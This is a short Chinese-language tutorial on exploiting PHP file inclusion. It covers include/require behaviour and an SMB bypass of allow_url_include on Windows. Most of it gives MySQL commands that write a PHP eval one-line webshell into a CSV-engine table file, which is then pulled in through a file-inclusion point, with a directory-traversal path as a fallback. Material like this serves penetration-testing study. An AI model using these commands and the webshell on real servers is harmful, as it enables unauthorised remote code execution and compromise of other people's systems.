# php文件包含利用

## 文件包含函数

用于引入外部代码，减少代码冗余

include()、include_once()：运行到那一行才引入，遇到错误继续下一行

require()、require_once()：先引入整合进代码，遇到错误停止程序

> _once：只引入一次

默认情况下allow_url_include=off，不允许引入外部文件

但存在一种特殊情况，windows可以通过SMB文件共享来绕过allow_url_include，文件包含时通过SMB共享文件来包含

## 利用mysql用户名密码写入一句话木马

> 爆破不出密码就尝试找其他文件上传漏洞

> 以下命令在mysql命令行环境中执行

### 查询数据库数据存储路径

```
select @@datadir
```

结果如：`D:\MySQL\data\`

### 选择数据库

- 查看数据库列表`select databases;`
- 选中有权限的数据库`use 数据库名`

### 创建表，将一句话木马作为字段名写入

```sql
create table if not exists `t`(`a` varchar(255) not null)engine=csv;
insert into t value('<?php eval($GET[8]);?>')
```

最后需要找到可控的引入点，将`D:\MySQL\data\数据库名\t.CSV`引入

绝对路径行不通的话可以尝试下相对路径`asdjfasdasdf/../../../../../../../../MySQL/data/数据库名/t.CSV`